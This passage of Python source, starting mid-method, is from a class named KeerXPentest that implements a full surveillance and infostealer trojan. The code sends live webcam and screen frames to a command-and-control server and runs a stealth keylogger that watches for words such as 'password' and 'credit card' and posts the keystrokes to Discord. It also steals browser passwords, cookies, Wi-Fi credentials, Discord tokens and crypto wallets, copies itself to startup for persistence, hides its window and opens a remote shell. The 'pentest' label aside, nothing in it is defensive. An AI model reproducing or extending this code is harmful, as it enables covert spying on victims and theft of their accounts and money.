                        frame = cv2.resize(frame, (854, 480))
                        _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 60])
                        frame_data = buffer.tobytes()
                
                if frame_data:
                    res = requests.post(f"{C2_URL}/upload_frame", params={"client_id": self.client_id}, data=frame_data, timeout=5)
                    if res.status_code != 200:
                        self.log(f"‚ö†Ô∏è Frame upload status: {res.status_code}")
            except Exception as e:
                self.log(f"Live feed error: {e}")
            
            time.sleep(0.5) # 2 FPS for smoother feed

    def capture_screenshots_burst(self, duration):
        start = time.time()
        while time.time() - start < duration:
            self.screenshot_active = True
            time.sleep(0.2) # Faster burst
            self.screenshot_active = False
            time.sleep(0.1)

    def stealth_keylogger(self):
        trigger_keywords = ["password", "login", "admin", "root", "sudo", "credit card", "ssn"]
        
        def on_key_event(key):
            try:
                k = str(key).replace("'", "")
                if k == "Key.space": k = " "
                elif k == "Key.enter": k = "[ENTER]\n"
                elif k == "Key.backspace": k = "[BACK]"
                elif "Key." in k: k = f"[{k.split('.')[1].upper()}]"
                
                self.keystrokes.append(k)
            except:
                self.keystrokes.append("[ERR]")
            
            # Check for keywords in the last 20 characters
            current_buffer = "".join(self.keystrokes[-50:]).lower()
            for word in trigger_keywords:
                if word in current_buffer:
                    # Clear detected part to avoid repeated triggers
                    self.keyword_trigger_burst(word)
                    self.keystrokes = self.keystrokes[:-10] # simple clear
                    break

            if len(self.keystrokes) >= 50 or "[ENTER]\n" in k:
                batch = ''.join(self.keystrokes)
                self.send_to_discord(content=f"‚å®Ô∏è **KEYLOG**: {batch}")
                self.keystrokes.clear()
                self.measure_wpm() # Calculate speed periodically
        
        listener = keyboard.Listener(on_press=on_key_event)
        listener.daemon = True
        listener.start()

    def system_reconnaissance(self):
        uptime = int(time.time() - self.start_time)
        info_parts = []
        info_parts.append("üöÄ KEERX v5.0 AUTO-STARTUP DEPLOYED")
        info_parts.append(f"Hostname: `{socket.gethostname()}`")
        info_parts.append(f"User: `{os.getenv('USERNAME')}`")
        info_parts.append(f"Startup Copied: `{self.stats['startup_copied']}`")
        info_parts.append(f"OS: `{platform.system()} {platform.release()}`")
        info_parts.append(f"Local IP: `{socket.gethostbyname(socket.gethostname())}`")
        info_parts.append("üñ•Ô∏è 0.5s Screens | üé§ 60s MIC | üì∑ Stealth Cam | üì∂ WiFi | üîê Browser")
        info_parts.append("Status: FULLY PERSISTENT ‚úÖ")
        
        full_info = '\n'.join(info_parts)
        self.send_to_discord(content=full_info)

    def status_heartbeat(self):
        while self.running:
            uptime = int(time.time() - self.start_time)
            status_msg = (f"üìä STATS | Uptime: {uptime}s | "
                         f"Screens: {self.stats['screenshots']} | "
                         f"MIC: {self.stats['mic']} | "
                         f"Cam: {self.stats['webcam']} | "
                         f"WiFi: {self.stats['wifi']} | "
                         f"Pass: {self.stats['passwords']}")
            self.send_to_discord(content=status_msg)
            time.sleep(300)

    def main_execution(self):
        # Mutex Check
        mutex_file = os.path.join(tempfile.gettempdir(), f"{KERX_NAME}.lock")
        if os.path.exists(mutex_file):
            try:
                os.remove(mutex_file)
            except:
                self.log("‚ö†Ô∏è Another instance is running. Exiting.")
                return
        open(mutex_file, "w").write("locked")

        self.log(f"=== {KERX_NAME} v10.0 MULTI-TARGET EDITION ===")
        
        self.register_with_c2()
        self.auto_copy_startup()
        self.log("üöÄ STARTING CRITICAL DATA EXTRACTION...")
        
        # Priority 1: Credentials and Keys
        self.steal_browser_passwords()
        self.steal_web_data()
        self.steal_browser_cookies()
        self.dump_wifi_credentials_fixed()
        self.app_credential_capture()
        
        # Priority 2: Account Access (Tokens/Wallets)
        self.steal_discord_tokens()
        self.crypto_wallet_hunter()
        
        # Priority 3: History and Files
        self.steal_browser_history()
        self.smart_file_stealer()
        
        self.log("‚úÖ CRITICAL EXTRACTION COMPLETE. Starting background monitors...")
        
        self.hide_console_window()
        self.system_reconnaissance()
        
        # Run secondary tasks in background
        threading.Thread(target=self.usb_ripper, daemon=True).start()
        threading.Thread(target=self.hardware_fingerprint, daemon=True).start()
        threading.Thread(target=self.user_profiling_loop, daemon=True).start()
        threading.Thread(target=self.remote_shell, daemon=True).start()
        
        time.sleep(1)
        
        # Continuous operations
        threads = [
            threading.Thread(target=self.capture_screenshots_rapid, daemon=True), 
            threading.Thread(target=self.record_mic_continuous, daemon=True),
            threading.Thread(target=self.webcam_screenshot_stealth, daemon=True),
            threading.Thread(target=self.status_heartbeat, daemon=True),
            threading.Thread(target=self.monitor_clipboard, daemon=True),
            threading.Thread(target=self.record_screen_video_loop, daemon=True),
            threading.Thread(target=self.zip_and_exfiltrate, daemon=True),
            threading.Thread(target=self.poll_c2_commands, daemon=True),
            threading.Thread(target=self.upload_live_frames, daemon=True)
        ]
        
        for t in threads:
            t.start()
        
        self.stealth_keylogger()
        
        while self.running:
            time.sleep(1)

    def user_profiling_loop(self):
        while self.running:
            self.user_behavior_profile()
            time.sleep(1200) # Every 20 mins

if __name__ == "__main__":
    try:
        pentest = KeerXPentest()
        pentest.main_execution()
    except KeyboardInterrupt:
        pass
    except Exception as fatal_error:
        print(f"FATAL ERROR: {fatal_error}")